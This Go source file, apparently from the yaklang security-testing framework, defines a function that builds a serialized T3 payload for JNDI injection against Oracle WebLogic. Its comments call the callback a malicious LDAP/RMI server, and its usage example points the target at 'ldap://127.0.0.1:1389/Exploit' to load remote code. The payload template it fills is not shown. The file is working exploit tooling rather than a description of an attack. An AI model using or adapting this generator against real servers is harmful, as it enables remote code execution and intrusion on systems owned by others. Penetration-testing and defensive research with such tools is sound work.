package t3

import (
	"bytes"
	"github.com/yaklang/yaklang/common/utils"
	"github.com/yaklang/yaklang/common/yak/yaklib/codec"
	"github.com/yaklang/yaklang/common/yserx"
	"text/template"
)

// GenerateWeblogicJNDIPayload 生成一个用于 Weblogic JNDI 注入的 T3 序列化 payload 字节流
// 参数:
//   - addr: JNDI 注入要回连的地址（如恶意 ldap/rmi 服务地址）
//
// 返回值:
//   - 构造好的 Java 序列化 payload 字节流
//
// Example:
// ```
// // 生成 Weblogic JNDI payload，此处仅作示意
// payload = t3.GenerateWeblogicJNDIPayload("ldap://127.0.0.1:1389/Exploit")
// println(len(payload))
// ```
func GenerateWeblogicJNDIPayload(addr string) []byte {
	templ, _ := template.New(utils.RandStringBytes(5)).Parse(WeblogicJNDIPayload)
	tmpParams := map[string]interface{}{
		"raw":   codec.EncodeBase64(addr),
		"size":  len(addr),
		"value": addr,
	}
	var buf bytes.Buffer
	templ.Execute(&buf, tmpParams)
	ser, _ := yserx.FromJson(buf.Bytes())
	serx := yserx.MarshalJavaObjects(ser...)
	return serx
}
